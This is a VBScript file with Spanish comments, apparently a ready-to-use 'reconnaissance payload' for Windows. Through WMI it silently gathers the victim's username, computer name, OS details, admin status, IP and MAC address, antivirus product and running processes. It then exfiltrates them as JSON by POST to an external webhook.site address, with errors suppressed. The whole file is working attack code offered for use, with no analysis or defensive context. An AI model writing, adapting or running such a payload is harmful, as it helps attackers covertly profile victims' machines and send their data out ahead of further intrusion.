' --- Payload de Reconocimiento Avanzado ---
On Error Resume Next

Dim objShell, objWMIService, colSettings, objComputer, colAccounts, objAccount, strComputer, http
Dim osInfo, arch, lang, isAdmin, ip, mac, antivirus, firewall, processes, jsonPayload

' Conexión al servicio WMI (Windows Management Instrumentation), la fuente de toda la información.
strComputer = "."
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

' --- 1. Información del Sistema Operativo y Hardware ---
Set colSettings = objWMIService.ExecQuery("Select * from Win32_OperatingSystem")
For Each objComputer in colSettings
    osInfo = objComputer.Caption & " " & objComputer.CSDVersion
    arch = objComputer.OSArchitecture
    lang = objComputer.OSLanguage
Next

' --- 2. Privilegios del Usuario ---
isAdmin = "False"
Set colAccounts = objWMIService.ExecQuery("Select * from Win32_UserAccount where Name='" & CreateObject("WScript.Network").UserName & "'")
For Each objAccount in colAccounts
    If objAccount.SIDType = 4 Or objAccount.SIDType = 5 Then ' 4=Admin, 5=System
        isAdmin = "True"
    End If
Next

' --- 3. Información de Red ---
ip = ""
mac = ""
Set colSettings = objWMIService.ExecQuery("Select IPAddress, MACAddress from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")
For Each objComputer in colSettings
    If IsArray(objComputer.IPAddress) Then
        ip = objComputer.IPAddress(0)
        mac = objComputer.MACAddress
        Exit For ' Nos quedamos con la primera IP activa
    End If
Next

' --- 4. Software de Seguridad ---
antivirus = "No Detectado"
Set colSettings = GetObject("winmgmts:\\" & strComputer & "\root\SecurityCenter2").ExecQuery("Select * from AntiVirusProduct")
For Each objComputer in colSettings
    antivirus = objComputer.displayName
    Exit For
Next

' --- 5. Lista de Procesos (los primeros 10 para no sobrecargar el webhook) ---
processes = ""
Set colSettings = objWMIService.ExecQuery("Select Name from Win32_Process")
i = 0
For Each objComputer in colSettings
    If i < 10 Then
        processes = processes & objComputer.Name & ", "
    Else
        Exit For
    End If
    i = i + 1
Next
If processes <> "" Then processes = Left(processes, Len(processes) - 2) ' Quita la última coma y espacio

' --- Construcción del Payload JSON ---
jsonPayload = "{ " & _
    """username"":""" & CreateObject("WScript.Network").UserName & """," & _
    """computerName"":""" & CreateObject("WScript.Network").ComputerName & """," & _
    """osInfo"":""" & osInfo & """," & _
    """architecture"":""" & arch & """," & _
    """language"":""" & lang & """," & _
    """isAdmin"":""" & isAdmin & """," & _
    """ipAddress"":""" & ip & """," & _
    """macAddress"":""" & mac & """," & _
    """antivirus"":""" & antivirus & """," & _
    """runningProcesses"":""" & processes & """" & _
"}"

' --- Exfiltración de Datos ---
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.open "POST", "https://webhook.site/7fd9006c-0899-4a59-9b31-bda674f6acbc", False
http.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
http.send jsonPayload
